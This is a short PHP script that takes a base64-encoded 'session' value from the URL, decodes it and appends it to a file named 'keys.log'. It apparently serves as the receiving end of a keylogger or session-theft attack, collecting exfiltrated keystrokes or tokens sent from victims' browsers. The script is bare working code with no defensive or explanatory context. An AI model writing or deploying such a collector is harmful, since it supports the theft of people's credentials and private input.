<?php
if (isset($_GET["session"])) {
    $keys = @base64_decode($_GET["session"]);

    $logfile = fopen("keys.log", "a+");
    fwrite($logfile, $keys);


    fclose($logfile);
}
?>
